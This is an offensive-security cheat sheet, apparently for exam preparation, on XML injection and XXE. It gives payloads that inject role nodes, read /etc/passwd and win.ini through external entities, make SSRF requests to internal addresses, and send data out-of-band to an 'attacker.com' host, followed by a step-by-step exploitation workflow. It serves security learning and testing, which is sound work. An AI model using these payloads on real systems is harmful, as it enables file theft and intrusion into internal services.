## Advanced Injection Attacks — XML Injection & XXE

## Objective
Exploit XML processing to:
- Manipulate data
- Read local files
- Perform SSRF
- Potentially achieve RCE

Think: *“How does the parser interpret my XML?”*

---

## 1. XML Injection

### Concept
Inject XML content to alter structure or logic

---

### Example input

```xml
<user>admin</user>
```

---

### Injection

```xml
<user>admin</user><role>admin</role>
```

→ Adds new node

---

### Breaking structure

```xml
</user><admin>true</admin>
```

---

### Use cases

- Modify roles/permissions
- Bypass validation
- Inject unexpected fields

---

## 2. XML Injection Indicators

- XML-based APIs (SOAP, XML POST)
- Errors on malformed XML
- Different behavior when structure changes

---

## 3. XML External Entity (XXE)

### Concept
Abuse XML parser to load external entities

---

### Basic payload

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

---

### Result

→ Server reads local file and returns content

---

## 4. File Disclosure

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

---

### Windows example

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

---

## 5. SSRF via XXE

```xml
<!ENTITY xxe SYSTEM "http://attacker.com">
```

→ Server makes request to attacker

---

### Internal access

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
```

---

## 6. Blind XXE (OOB)

### DNS/HTTP exfiltration

```xml
<!ENTITY xxe SYSTEM "http://attacker.com/data">
```

→ Monitor callback

---

## 7. Parameter Entities (Advanced)

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com">
  %xxe;
]>
```

---

## 8. Where to Test

- SOAP APIs
- XML file uploads
- SSO / SAML
- Document parsers (PDF, SVG)

---

## 9. Indicators of Vulnerability

- File contents returned
- External requests triggered
- Parser errors
- Delayed responses

---

## 10. Fast Workflow (Exam Mode)

1. Identify XML input
2. Inject basic XXE payload
3. Test:
   - file read (`/etc/passwd`)
   - SSRF (internal IP)
4. If blind:
   - use OOB (attacker server)
5. Observe:
   - response content
   - callbacks
6. Confirm vulnerability

---

## 11. Mental Model

XML parser is powerful:
- Can load files
- Can fetch URLs

If not secured:
→ You control what it loads  
→ You control what it exposes